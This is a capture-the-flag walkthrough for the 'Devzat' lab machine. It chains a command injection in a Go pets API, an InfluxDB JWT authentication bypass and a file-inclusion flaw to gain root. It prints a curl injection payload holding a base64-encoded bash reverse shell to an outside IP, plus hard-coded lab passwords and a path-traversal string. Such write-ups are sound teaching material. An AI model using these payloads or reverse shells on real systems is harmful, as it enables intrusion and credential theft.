@@ -1,0 +1,270 @@
+                      Devzat
+
+                                                                                  9th March 2022 / Document No D22.100.161
+
+                                                                                  Prepared By: amra
+                                                                                  Machine Author: c1sc0
+                                                                                  Difficulty: Medium
+
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+Devzat is a medium Linux machine that features a web server and the Devzat chat application. Upon
+enumerating the web server, a new vhost called pets can be discovered. The pets vhost has a .git
+directory with listing enabled, providing access to the source code of pets . Reviewing the source code, a
+command injection vulnerability is discovered allowing an attacker to gain a reverse shell as the user
+patrick . Logging to the Devzat chat application as patrick on the remote machine the chat history
+between patrick and admin reveals that InfluxDB is installed on the remote system. Enumerating
+InfluxDB it is discovered that the version installed is vulnerable to CVE-2019-20933, an authentication
+bypass vulnerability. Exploiting the aforementioned vulnerability an attacker is able to dump the contents of
+InfluxDB revealing the password of the user catherine . Switching from patrick to catherine and
+logging in to the Devzat chat application as catherine the chat history between the two reveals that a dev
+application is running on the remote machine and it's source code is located on the backups of
+catherine . Reviewing the source code of the dev service, it is revealed that it's the same Devzat chat
+application with an extra authenticated command to include files on the chat. The credentials to perform
+this action are hard-coded on the source code and the command is vulnerable to LFI. Meaning that
+catherine can login to the dev chat, dump the contents of the SSH key of root and ultimately gain a shell
+as root on the remote machine using the SSH key.
+
+Skills Required
+      Enumeration
+      Known vulnerabilities research
+
+Skills Learned
+
+      Source code review
+      Command Injection
+      Local File Inclusion attack
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.118 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.118
+
+Nmap output reveals three ports open. On port 22 SSH is enabled, on port 80 an Apache HTTP server is
+running and port 8000 seems to host another SSH service.
+Nmap also reveals that upon visiting port 80 we are redirected to http://devzat.htb . So we modify our
+hosts file accordingly.
+
+   echo '10.10.11.118 devzat.htb' | sudo tee -a /etc/hosts
+
+Apache
+
+Let's browse to http://devzat.htb .
+Exploring the webpage while scrolling down we find a message that mentions the service running on port
+8000 .
+It seems like there is a chat service running on port 8000. We can use the command template provided by
+the webpage to access the service.
+
+Note that ssh-rsa is now deprecated on the latest versions of OpenSSH, so we need to modify the
+command a little bit to accept the ssh-rsa key.
+Upon searching online for the name of the box we find a Github project called Devzat, a chat over SSH.
+Looking at the documentation we can try commands like /help to further enumerate the chat service.
+The /help command reveals another interesting command, /commands to list all available commands.
+
+Further enumeration reveals no useful information. Thus, we continue our enumeration on the other
+services.
+
+Gobuster
+
+Using Gobuster to reveal additional directories and files hosted on the webserver, yields no fruitful results.
+But, we can also use Gobuster to discover additional vhosts.
+   gobuster vhost -u http://devzat.htb -w /usr/share/seclists/Discovery/Web-Content/raft-
+   small-words.txt -r
+Notice the -r flag to follow redirects in order to output only valid vhosts since everything redirects to
+devzat.htb .
+
+We have successfully discovered a new virtual host, pets.devzat.htb . Let's add it to our hosts file so we
+can navigate to it.
+
+   echo '10.10.11.118 pets.devzat.htb' >> /etc/hosts
+Now that we have a new vhost we could try to run Gobuster against the pets vhost to check if there are
+any interesting directories or files.
+
+   gobuster dir -u http://pets.devzat.htb -w /usr/share/seclists/Discovery/Web-
+   Content/raft-small-words.txt -b 200
+This time we are not interested on results that return 200 OK because everything returns with 200 OK .
+Hence, we use the -b 200 flag to blacklist such results.
+
+A .git folder exists with directory listing enabled.
+
+Git-dumper
+
+We can use Git-dumper to dump the contents of the newly discovered .git folder.
+   git-dumper http://pets.devzat.htb/.git pets-git
+Foothold
+
+Looking at main.go we find the source code for the pets vhost. Reviewing the source code carefully we
+can craft an exploit chain that will get us a reverse shell.
+First of all, the function handleRequest() reveals the /api/pet endpoint.
+
+   func handleRequest() {
+          <SNIP>
+                 // API routes
+                 apiHandler := http.HandlerFunc(petHandler)
+                 http.Handle("/api/pet", headerMiddleware(apiHandler))
+                 log.Fatal(http.ListenAndServe("127.0.0.1:5000", nil))
+
+   }
+
+This endpoint calls the petHandler() function.
+
+   func petHandler(w http.ResponseWriter, r *http.Request) {
+                 // Dispatch by method
+                 if r.Method == http.MethodPost {
+                                addPet(w, r)
+                 } else if r.Method == http.MethodGet {
+                                getPets(w, r)
+
+                 } else {
+                                http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+
+                 }
+                 // TODO: Add Update and Delete
+   }
+
+According to this function if we make a POST request to this endpoint we can add a pet. The source code
+also reveals the structure of a Pet object.
+type Pet struct {
+
+   Name            string `json:"name"`
+
+   Species         string `json:"species"`
+
+   Characteristics string `json:"characteristics"`
+
+}
+
+So to add a pet we need to send the data in Json format according to the following format:
+
+{
+       "name": "Test pet",
+       "species": "dog",
+       "characteristics": "corgi"
+
+}
+
+Afterwards, addPet() will be called:
+
+func addPet(w http.ResponseWriter, r *http.Request) {
+              <SNIP>
+
+              addPet.Characteristics = loadCharacter(addPet.Species)
+              Pets = append(Pets, addPet)
+
+              w.WriteHeader(http.StatusOK)
+              fmt.Fprint(w, "Pet was added successfully")
+}
+
+The addPet() function makes one last call to loadCharacter() before adding the pet.
+
+func loadCharacter(species string) string {
+              cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
+              stdoutStderr, err := cmd.CombinedOutput()
+              if err != nil {
+                             return err.Error()
+              }
+              return string(stdoutStderr)
+
+}
+
+Reviewing this function reveals a code injection vulnerability. More specifically, "cat
+characteristics/"+species is used as an argument for sh without any sanitization.
+So, we can craft a payload to give us a reverse shell and inject it to the species field on the Json data.
+First of all, we set up a listener on our local machine:
+
+nc -lvnp 9001
+Then, we can use Curl to sent a base64 encoded payload in order to avoid possible issues with any bad
+characters.
+
+   curl -X POST -d '{"name":"Test pet","species":"dog;echo
+   YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzkwMDEgMD4mMSAK|base64 -
+   d|bash","characteristics":"corgi"}' -H "'Content-Type': 'application/json'"
+   "http://pets.devzat.htb/api/pet"
+Finally, we have a reverse shell as the user patrick on our listener.
+
+To get a more stable connection we could use patrick's ssh key found under /home/patrick/.ssh/id_rsa .
+
+Copying the contents of the key to our local machine and changing the permission of the file with chmod
+600 patrick_key we can use SSH to get a shell on the remote machine.
+
+Lateral Movement
+On the home folder of the user patrick ther is no user.txt file, meaning that we probably need to switch
+to another user. Listing the contents of /home we find the user catherine .
+
+To further progress on the machine we need to retrace our enumeration steps and remember the chat
+application. We can login to the chat application using patrick as our username.
+
+We are presented with the chat history between patrick and admin . admin informs patrick that
+influxdb is installed on the system. Searching online, we find the InfluxDB project. Inside the
+documentation it is mentioned that the InfluxDB listens by default on port 8086 . So we could try to check
+the version of InfluxDB installed on the system.
+
+Using Curl we see that the installed version of InfluxDB is 1.7.5 . Searching online for possible
+vulnerabilities for this version we find that it is vulnerable to Authentication Bypass. More specifically a JWT
+token with empty secret is valid and allows authentication.
+The documentation of InfluxDB comes handy as it states the structure of a valid payload for the JWT token:
+We can use jwt.io as mentioned in the official documentation to create a malicious JWT token. For the exp
+date we will use the current epoch time plus a year to make sure the token won't expire. For the username
+field the value admin seems the most reasonable since patrick was informed by admin that the InfluxDB
+has been installed on the system. With these values we can create a JWT token.
+With the JWT token we can query the database using Curl as mentioned in the documentation.
+There is a database called devzat . Let's check what tables are available.
+We have a table called user . We can extract all the data from the user table using the following command:
+
+   curl -G $url --data-urlencode "db=devzat" --data-urlencode "q=SELECT * FROM \"user\"" -
+   H "Authorization: Bearer $token"
+We have three sets of credentials. More importantly we have the password for catherine :
+woBeeYareedahc7Oogeephies7Aiseci .
+We can check for password re-use on the remote system for the user catherine .
+
+We are able to switch to the catherine user and read the user.txt , inside the home folder of
+catherine .
+
+Privilege Escalation
+Privilege Escalation
+
+Once again, we login to the chat application using catherine as the username.
+
+This time we are presented with the chat history between catherine and patrick . Patrick informs
+Cathrine that a development instance of an application is listening on localhost on port 8443 and that the
+source code for this application is available in catherine's backups.
+First of all, we check if there is a service running on 8443 as Patrick informed us.
+
+Indeed there is a service running on the remote machine that's listening only on localhost on port 8443 .
+Now, we have to locate the source code of the application to review it. Patrick mentioned that the source
+code lies on catherine's backups. So the directory /var/backups seems a reasonable place to look for it.
+
+Having the source code, we need to find a way to transfer to our local machine for further analysis. The
+easiest way is to copy a public key to /home/catherine/.ssh/authorized_keys and use SCP to copy the
+files over to our machine.
+First, we create a pair of private-public keys locally.
+Next, we copy the contents of catherine.pub to /home/catherine/.ssh/authorized_keys on the
+remote machine.
+Now, we can use SCP to copy the files to our machine.
+
+Judging by the name of the files it stands to reason that the service listening on port 8443 is the chat
+application with some new features implemented. Since we have the source code for both main and dev
+the easiest way to check for differences between the two is to use the diff command.
+First, we have to extract the source code for both dev and main .
+Then, we execute the diff command to highlight all the differences between the two folders.
+Looking at the output we can see that Patrick implemented a new command called file . Luckily, we have
+the source code for the fileCommand() function that seems to get called when the file command is used
+on the chat application.
+
+Reviewing the fileCommand() function we can see that it takes two arguments: a file path and a password.
+The correct password is hardcoded just a few lines below as CeilingCatStillAThingIn2021? .
+
+Then, the path to the file that will be printed gets concatenated with the current working directory before
+trying to access the file. The developer's intent was probably to restrict the access to files outside the
+current working directory. Alas, no sanitization is performed on the user controlled variable path , meaning
+we can perform an LFI attack to try an read the SSH key of root using the following path:
+../.../../../../../root/.ssh/id_rsa .
+The root SSH key is successfully retrieved. Now, we paste it on our local machine and remove the
+unwanted content (the [SYSTEM] prompt). Then, we change the key's permissions to 600 . Finally, we can
+login as root and read /root/root.txt .
+
